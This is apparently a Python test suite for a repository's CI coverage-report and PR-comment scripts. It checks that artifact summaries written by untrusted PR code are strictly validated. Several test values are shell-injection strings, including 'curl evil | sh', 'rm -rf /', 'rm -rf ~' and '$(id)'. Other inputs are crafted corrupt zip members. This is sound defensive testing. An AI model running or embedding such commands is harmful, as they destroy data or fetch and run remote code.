"""Tests of the coverage report scripts: coverage-summary.py --json, coverage_comment.py (the PR
comment, which reads an artifact the PR's code could have written) and coveralls-paths.py.

    python3 -B -m unittest discover -s scripts -p test_coverage_reports.py
"""
import importlib.util
import io
import json
from pathlib import Path
import struct
import tempfile
import unittest
import unittest.mock
import zipfile
import zlib

HERE = Path(__file__).resolve().parent


def load(name, file):
    spec = importlib.util.spec_from_file_location(name, HERE / file)
    module = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(module)
    return module


summary = load("coverage_summary", "coverage-summary.py")
comment = load("coverage_comment", "coverage_comment.py")
paths = load("coveralls_paths", "coveralls-paths.py")

SHA = "03a15d9cedf3adbc0af0f09ee8a2159105084de6"
BASE_SHA = "04c1d3100f044dc1cdd0c56c58f9be063a0b6c7d"
REPO = "UkrainianWiki/wlxjury"
SCOVERAGE = ('<?xml version="1.0"?>\n<scoverage statement-count="20807" statements-invoked="18849" '
             'statement-rate="90.59" branch-rate="86.70" version="1.0"></scoverage>\n')
JEST = {"total": {k: {"total": 10, "covered": 9, "skipped": 0, "pct": p} for k, p in
                  (("lines", 96.8), ("statements", 96.8), ("functions", 93.87), ("branches", 91.58))}}


def doc(**changes):
    data = {"version": 1, "head_sha": SHA, "pr": 263,
            "scala": {"statements": 90.59, "branches": 86.7},
            "js": {"lines": 96.8, "branches": 91.58}}
    data.update(changes)
    return json.dumps(data).encode("utf-8")


def zipped(raw, name=comment.SUMMARY_FILE):
    buffer = io.BytesIO()
    with zipfile.ZipFile(buffer, "w") as archive:
        archive.writestr(name, raw)
    return buffer.getvalue()


class SummaryJsonTest(unittest.TestCase):
    def reports(self, tmp):
        scoverage, jest = Path(tmp) / "scoverage.xml", Path(tmp) / "summary.json"
        scoverage.write_text(SCOVERAGE, encoding="utf-8")
        jest.write_text(json.dumps(JEST), encoding="utf-8")
        return scoverage, jest

    def test_writes_what_the_comment_accepts(self):
        with tempfile.TemporaryDirectory() as tmp:
            scoverage, jest = self.reports(tmp)
            out = Path(tmp) / "out" / "coverage-summary.json"
            with unittest.mock.patch("sys.stdout", new=io.StringIO()):
                summary.main(["--scoverage", str(scoverage), "--jest", str(jest), "--json", str(out),
                              "--head-sha", SHA, "--pr", "263"])
            parsed = comment.parse_summary(out.read_bytes())
        self.assertEqual(parsed["scala"], {"statements": 90.59, "branches": 86.7})
        self.assertEqual(parsed["js"], {"lines": 96.8, "branches": 91.58})
        self.assertEqual((parsed["head_sha"], parsed["pr"]), (SHA, 263))

    def test_missing_or_broken_reports_are_null_and_a_push_has_no_pr(self):
        with tempfile.TemporaryDirectory() as tmp:
            broken = Path(tmp) / "broken.json"
            broken.write_text("{", encoding="utf-8")
            data = summary.summary_data(Path(tmp) / "none.xml", broken, SHA, None)
        self.assertEqual((data["scala"], data["js"], data["pr"]), (None, None, None))
        comment.parse_summary(json.dumps(data).encode("utf-8"))

    def test_refuses_a_bad_sha_or_pr(self):
        for sha in ("", "abc", SHA.upper(), SHA + "0", "$(id)" + SHA[5:]):
            with self.assertRaises(ValueError):
                summary.summary_data(Path("none"), Path("none"), sha, None)
        for pr in ("0", "-1", "1;id", "$(id)", "12a", "1e3"):
            with self.assertRaises(Exception):
                summary._pr_number(pr)
        self.assertIsNone(summary._pr_number(""))


class ParseSummaryTest(unittest.TestCase):
    def refused(self, raw):
        with self.assertRaises(comment.SummaryError):
            comment.parse_summary(raw)

    def test_accepts_the_format(self):
        self.assertEqual(comment.parse_summary(doc())["pr"], 263)
        self.assertIsNone(comment.parse_summary(doc(pr=None, js=None))["js"])

    def test_refuses_hostile_numbers(self):
        for bad in ("90; curl evil | sh", "$(touch /tmp/x)", "`id`", "90.5", "1e2", None, True,
                    [90], {"v": 1}, -0.01, 100.01, 1e308 * 10):
            self.refused(doc(scala={"statements": bad, "branches": 1}))
        self.refused(b'{"version":1,"head_sha":"%s","pr":1,"scala":{"statements":NaN,"branches":1},'
                     b'"js":null}' % SHA.encode())
        self.refused(b'{"version":1,"head_sha":"%s","pr":1,"scala":{"statements":Infinity,'
                     b'"branches":1},"js":null}' % SHA.encode())

    def test_refuses_other_fields(self):
        self.refused(doc(pr="263"))
        self.refused(doc(pr=True))
        self.refused(doc(pr=0))
        self.refused(doc(pr="263 && rm -rf /"))
        self.refused(doc(head_sha="$(id)"))
        self.refused(doc(head_sha=SHA.upper()))
        self.refused(doc(version=2))
        self.refused(doc(version=True))
        self.refused(doc(extra="x"))
        self.refused(doc(scala={"statements": 1, "branches": 1, "lines": 1}))
        self.refused(doc(js={"lines": 1}))
        self.refused(doc(js="96.8"))
        self.refused(json.dumps([1]).encode())

    def test_refuses_non_json_and_large_input(self):
        self.refused(b"")
        self.refused(b"\xff\xfe")
        self.refused(b"{" * 10)
        self.refused(b'{"version":1,"version":1}')
        self.refused(b" " * (comment.MAX_JSON_BYTES + 1))
        self.refused("not bytes")

    def test_zip_reads_only_the_summary(self):
        self.assertEqual(comment.read_summary_zip(zipped(doc()))["pr"], 263)
        for blob in (b"not a zip", zipped(doc(), name="other.json"), zipped(b"x" * (comment.MAX_JSON_BYTES + 1)),
                     b"\0" * (comment.MAX_ZIP_BYTES + 1)):
            with self.assertRaises(comment.SummaryError):
                comment.read_summary_zip(blob)

    def raw_read(self, blob):
        with zipfile.ZipFile(io.BytesIO(blob)) as archive:
            return archive.read(comment.SUMMARY_FILE)

    def test_corrupt_deflate_is_refused_not_raised(self):
        blob = corrupt_deflate(deflated(doc()))
        with self.assertRaises(zlib.error):  # what zipfile itself raises: not a BadZipFile
            self.raw_read(blob)
        with self.assertRaises(comment.SummaryError):
            comment.read_summary_zip(blob)

    def test_truncated_member_is_refused_not_raised(self):
        blob = truncated_member(deflated(doc()), 10)
        # zipfile raises BadZipFile (CRC) or EOFError, depending on the Python version
        with self.assertRaises((zipfile.BadZipFile, EOFError)):
            self.raw_read(blob)
        with self.assertRaises(comment.SummaryError):
            comment.read_summary_zip(blob)

    def test_deeply_nested_json_is_refused_not_raised(self):
        # Deep nesting within the size cap: whether json raises RecursionError for it depends on
        # the Python version (3.8 does at this depth, the runner's newer Python parses it), so
        # the test asserts only our result: refused either way, never an exception
        raw = b"[" * 8000 + b"]" * 8000
        self.assertLessEqual(len(raw), comment.MAX_JSON_BYTES)
        with self.assertRaises(comment.SummaryError):
            comment.parse_summary(raw)
        with self.assertRaises(comment.SummaryError):
            comment.read_summary_zip(deflated(raw))

    def test_recursion_error_from_json_is_refused_not_raised(self):
        # The RecursionError path itself, on every Python version
        with unittest.mock.patch.object(comment.json, "loads", side_effect=RecursionError):
            with self.assertRaises(comment.SummaryError):
                comment.parse_summary(b"{}")


def deflated(raw):
    buffer = io.BytesIO()
    with zipfile.ZipFile(buffer, "w", compression=zipfile.ZIP_DEFLATED) as archive:
        archive.writestr(comment.SUMMARY_FILE, raw)
    return buffer.getvalue()


def _data_offset(blob):
    name_len, extra_len = struct.unpack_from("<HH", blob, 26)
    return 30 + name_len + extra_len


def corrupt_deflate(blob):
    """The member's first deflate byte set to 0xFF: a block of the reserved type 3."""
    data = bytearray(blob)
    data[_data_offset(blob)] = 0xFF
    return bytes(data)


def truncated_member(blob, size):
    """The member's compressed size cut to size bytes, in both headers: its stream ends early."""
    data = bytearray(blob)
    struct.pack_into("<I", data, 18, size)
    central = data.index(b"PK\x01\x02")
    struct.pack_into("<I", data, central + 20, size)
    return bytes(data)


class RenderTest(unittest.TestCase):
    def test_table_with_a_base(self):
        head = comment.parse_summary(doc())
        base = comment.parse_summary(doc(scala={"statements": 90.5, "branches": 87.0}, js=None))
        body = comment.render_comment(head, base, "https://github.com/x/y/actions/runs/1", "success",
                                      "stack/79-round-image-event", "at `04c1d31`")
        self.assertTrue(body.startswith(comment.MARKER))
        self.assertIn("| Scala statements | 90.59 % | 90.50 % | +0.09 |", body)
        self.assertIn("| Scala branches | 86.70 % | 87.00 % | -0.30 |", body)
        self.assertIn("| JS lines | 96.80 % | n/a |  |", body)
        self.assertIn("base `stack/79-round-image-event` (at `04c1d31`)", body)
        self.assertNotIn("partial", body)

    def test_no_base_and_a_failed_run(self):
        body = comment.render_comment(comment.parse_summary(doc(js=None)), None, "u", "failure",
                                      "master", "no base run")
        self.assertIn("| JS branches | n/a | n/a |  |", body)
        self.assertIn("(no base run)", body)
        self.assertIn("ended with `failure`", body)

    def test_branch_name_cannot_break_out_of_its_code_span(self):
        self.assertEqual(comment.safe_ref("a`b<script>\n](x)"), "a?b?script???(x)".replace("(", "?").replace(")", "?"))


class FakeApi:
    """The API calls coverage_comment makes, answered from dicts; records what it sends."""

    def __init__(self, artifacts, zips, pulls, runs=None, comments=None):
        self.artifacts, self.zips, self.pulls = artifacts, zips, pulls
        self.runs, self.comments, self.sent = runs or [], comments or [], []

    def get_json(self, path):
        if "/artifacts?" in path:
            run_id = int(path.split("/runs/")[1].split("/")[0])
            return {"artifacts": self.artifacts.get(run_id, [])}
        if "/workflows/" in path:
            return {"workflow_runs": self.runs}
        if "/pulls/" in path:
            return self.pulls[int(path.rsplit("/", 1)[1])]
        if "/comments?" in path:
            return self.comments if "page=1" in path else []
        raise AssertionError(path)

    def get_bytes(self, path):
        return self.zips[int(path.split("/artifacts/")[1].split("/")[0])]

    def send(self, method, path, payload):
        self.sent.append((method, path, payload["body"]))
        return {}


def artifact(id_, name, size=200):
    return {"id": id_, "name": name, "expired": False, "size_in_bytes": size}


def event(**changes):
    run = {"id": 100, "run_attempt": 1, "workflow_id": 7, "event": "pull_request", "head_sha": SHA,
           "conclusion": "success", "head_branch": "stack/80", "head_repository": {"full_name": REPO},
           "pull_requests": [{"number": 263, "head": {"sha": SHA}, "base": {"ref": "stack/79"}}]}
    run.update(changes)
    return {"workflow_run": run}


ENV = {"GITHUB_REPOSITORY": REPO, "GITHUB_SERVER_URL": "https://github.com"}
PULL = {"state": "open", "head": {"sha": SHA, "repo": {"full_name": REPO}},
        "base": {"ref": "stack/79", "sha": BASE_SHA}}
BASE_RUN = {"id": 90, "head_sha": BASE_SHA, "head_branch": "stack/79", "head_repository": {"full_name": REPO}}


def api(**changes):
    args = {"artifacts": {100: [artifact(1, "coverage-summary-attempt-1"), artifact(2, "coverage-reports-attempt-1")],
                          90: [artifact(3, "coverage-summary-attempt-1")]},
            "zips": {1: zipped(doc()), 3: zipped(doc(head_sha=BASE_SHA, pr=262,
                                                     scala={"statements": 90.0, "branches": 86.7}))},
            "pulls": {263: PULL}, "runs": [BASE_RUN]}
    args.update(changes)
    return FakeApi(**args)


class RunTest(unittest.TestCase):
    def test_creates_the_comment_with_the_base(self):
        fake = api()
        self.assertEqual(comment.run(event(), ENV, fake), "#263: created")
        method, path, body = fake.sent[0]
        self.assertEqual((method, path), ("POST", f"repos/{REPO}/issues/263/comments"))
        self.assertIn("| Scala statements | 90.59 % | 90.00 % | +0.59 |", body)
        self.assertIn("(at `04c1d31`)", body)
        self.assertIn("https://github.com/UkrainianWiki/wlxjury/actions/runs/100", body)

    def test_updates_the_bots_comment_not_a_users_copy_of_the_marker(self):
        comments = [{"id": 5, "user": {"login": "someone"}, "body": comment.MARKER},
                    {"id": 6, "user": {"login": comment.BOT}, "body": comment.MARKER + "\nold"}]
        fake = api(comments=comments)
        self.assertEqual(comment.run(event(), ENV, fake), "#263: updated")
        self.assertEqual(fake.sent[0][:2], ("PATCH", f"repos/{REPO}/issues/comments/6"))

    def test_a_bot_comment_that_only_quotes_the_marker_is_not_ours(self):
        comments = [{"id": 7, "user": {"login": comment.BOT}, "body": "Quoted: " + comment.MARKER},
                    {"id": 8, "user": {"login": comment.BOT}, "body": None}]
        fake = api(comments=comments)
        self.assertEqual(comment.run(event(), ENV, fake), "#263: created")
        self.assertEqual(fake.sent[0][:2], ("POST", f"repos/{REPO}/issues/263/comments"))

    def test_no_base_run(self):
        fake = api(runs=[])
        comment.run(event(), ENV, fake)
        self.assertIn("(no base run)", fake.sent[0][2])

    def test_a_base_run_whose_summary_is_of_another_commit_is_skipped(self):
        fake = api(zips={1: zipped(doc()), 3: zipped(doc(pr=262))})
        comment.run(event(), ENV, fake)
        self.assertIn("(no base run)", fake.sent[0][2])

    def test_skips_forks_pushes_and_other_commits(self):
        for ev in (event(event="push"), event(head_repository={"full_name": "evil/wlxjury"}),
                   event(pull_requests=[]), event(pull_requests=[{"number": 263, "head": {"sha": BASE_SHA}}]),
                   event(id="100; id"), event(head_sha="$(id)"), event(conclusion="`id`")):
            fake = api()
            self.assertTrue(comment.run(ev, ENV, fake).startswith("skipped"), ev)
            self.assertEqual(fake.sent, [])

    def test_skips_a_pr_with_newer_commits_or_from_a_fork(self):
        for pull in (dict(PULL, head={"sha": BASE_SHA, "repo": {"full_name": REPO}}),
                     dict(PULL, head={"sha": SHA, "repo": {"full_name": "evil/wlxjury"}}),
                     dict(PULL, state="closed")):
            fake = api(pulls={263: pull})
            comment.run(event(), ENV, fake)
            self.assertEqual(fake.sent, [])

    def test_refuses_a_summary_of_another_commit_or_pr_or_a_hostile_one(self):
        for blob in (zipped(doc(head_sha=BASE_SHA)), zipped(doc(pr=1)),
                     zipped(doc(scala={"statements": "1; rm -rf ~", "branches": 1}))):
            fake = api(zips={1: blob})
            with self.assertRaises(comment.SummaryError):
                comment.run(event(), ENV, fake)
            self.assertEqual(fake.sent, [])

    def test_reads_this_attempts_summary_only(self):
        fake = api()
        self.assertEqual(comment.run(event(run_attempt=2), ENV, fake), "skipped: the run has no coverage summary")


class CoverallsPathsTest(unittest.TestCase):
    def test_paths_become_relative_to_the_repository(self):
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            (root / "app" / "controllers").mkdir(parents=True)
            (root / "app" / "controllers" / "A.scala").write_text("x", encoding="utf-8")
            (root / "public" / "javascripts").mkdir(parents=True)
            (root / "public" / "javascripts" / "a.js").write_text("x", encoding="utf-8")
            (root / "javascript-test").mkdir()
            xml = ('<coverage><sources><source>--source</source><source>%s</source></sources>'
                   '<packages><package><classes><class name="A" filename="controllers/A.scala"/>'
                   '<class name="G" filename="Gone.scala"/></classes></package></packages></coverage>'
                   % (root / "app"))
            out = paths.cobertura_with_repo_paths(xml, root)
            self.assertIn('filename="app/controllers/A.scala"', out)
            self.assertIn('filename="Gone.scala"', out)
            lcov = paths.lcov_with_repo_paths("TN:\nSF:../public/javascripts/a.js\nDA:1,1\nend_of_record\n"
                                              "SF:../../outside.js\nend_of_record\n", root)
            self.assertIn("SF:public/javascripts/a.js\n", lcov)
            self.assertIn("SF:../../outside.js\n", lcov)


if __name__ == "__main__":
    unittest.main()
